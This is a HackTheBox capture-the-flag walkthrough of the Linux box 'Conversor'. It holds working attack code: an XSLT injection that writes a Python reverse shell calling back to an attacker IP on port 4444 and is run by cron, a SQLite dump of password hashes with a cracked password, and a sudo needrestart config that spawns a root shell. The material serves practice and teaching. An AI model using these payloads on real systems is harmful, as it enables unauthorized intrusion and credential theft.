# Conversor — HackTheBox Walkthrough

> **Platform:** Hack The Box\
> **Machine Name:** Conversor\
> **OS:** Linux\
> **Difficulty:** Easy

---

## Reconnaissance

### Port Scanning

Initial enumeration was done using **nmap**:

```bash
nmap -sV -sC 10.10.11.92
```

**Result:**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.52
```

Two services were exposed:

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 22   | SSH     | OpenSSH 8.9p1 |
| 80   | HTTP    | Apache 2.4.52 |

The HTTP service redirected to a virtual host.

---

## Host Resolution

To resolve the hostname locally:

```bash
echo "10.10.11.92 conversor.htb" | sudo tee -a /etc/hosts
```

This allowed proper access to the web application at:

```
http://conversor.htb
```

---

## Web Enumeration

### Application Overview

Browsing the site revealed:

- Login page
- Registration functionality

A new account was registered and used to log in.

After login, the application presented itself as an **Nmap XML converter**, intended to process scan results and generate visual analysis.


## Source Code Disclosure

To gain deeper insight, I performed directory enumeration:

```bash
dirsearch -u http://conversor.htb
```

This revealed an **/about** endpoint, which contained a link to download the full application source code.

### Source Review

```bash
tar -xvf source_code.tar.gz
```

Findings:

- Python **Flask** application
- Runnable via `python3 app.py` or Apache WSGI
- Web process runs as `www-data`

```
.
├── app.py
├── app.wsgi
├── install.md
├── instance
│   └── users.db
├── scripts
├── source_code.tar.gz
├── static
│   ├── images
│   │   ├── arturo.png
│   │   ├── david.png
│   │   └── fismathack.png
│   ├── nmap.xslt
│   └── style.css
├── templates
│   ├── about.html
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   └── result.html
└── uploads

```
### Critical Discovery

A cron job executes **every ****************************************************************`.py`**************************************************************** file** in:

```
/var/www/conversor.htb/scripts/
```

- Execution interval: **every minute**
- Uploaded files are deleted after **60 minutes**

This provided a reliable code execution vector.

---

## Exploitation - XSLT Injection

The application’s XSLT engine allows **file write operations**.

### Strategy

1. Abuse XSLT to write a Python reverse shell into:
   ```
   /var/www/conversor.htb/scripts/
   ```
2. Wait for cron to execute the payload

---

### Payload Preparation

#### XML File (`test.xml`)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Test</title>
    <artist>death</artist>
    <company>xyz Company</company>
    <price>1</price>
    <year>2300</year>
  </cd>
</catalog>
```

#### XSLT Payload (`test.xslt`)

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exsl="http://exslt.org/common"
 extension-element-prefixes="exsl">
<xsl:template match="/">
  <exsl:document href="/var/www/conversor.htb/scripts/pwn.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
  </exsl:document>
</xsl:template>
</xsl:stylesheet>

```

---

### Listener

```bash
nc -lnvp 4444
```

After uploading both files and triggering the conversion, the cron job executed the malicious Python script.

✅ **Reverse shell received as ****************************************************************`www-data`****************************************************************.**

---

## Post-Exploitation

### Application Inspection

```bash
cd /var/www/conversor.htb
ls -la
```

Directory structure matched a typical Flask application:

- `app.py`
- `instance/`
- `scripts/`
- `uploads/`

---

## Credential Harvesting

The `instance` directory contained a SQLite database:

```bash
cd instance
sqlite3 users.db "SELECT * FROM users;"
```

This returned user records including password hashes.

One notable user:

```
fismathack
```

The password hash was cracked using **CrackStation**, yielding:

```
Keepmesafeandwarm
```

---

## SSH Access

```bash
ssh fismathack@10.10.11.92
# Password: Keepmesafeandwarm
```

User access obtained and **user flag** captured.

---

## Privilege Escalation — Root

### Sudo Permissions

```bash
sudo -l
```

The output revealed permission to execute:

```
/usr/sbin/needrestart
```

---

## Root Exploitation — needrestart Config Injection

`needrestart` allows loading a custom Perl configuration file using `-c`.

- Config files are executed as **root**
- Sudo does not restrict file arguments

---

### Step 1 — Create Malicious Config

```bash
cat > /tmp/root.conf << 'EOF'
system("/bin/bash");
EOF
```

### Step 2 — Execute needrestart

```bash
sudo /usr/sbin/needrestart -c /tmp/root.conf
```

💥 **Root shell spawned instantly.**

---

## Conclusion

The *Conversor* machine delivers a clean and realistic attack chain:

- Web enumeration and source code analysis
- XSLT injection leading to code execution
- Credential extraction from application database
- SSH lateral movement
- Privilege escalation via `needrestart` config injection

This box strongly reinforces the value of **source code review**, understanding **file-processing pipelines**, and recognizing **misconfigured sudo binaries**. A highly enjoyable and well-balanced Linux challenge.

---

**Happy Hacking 🚀**

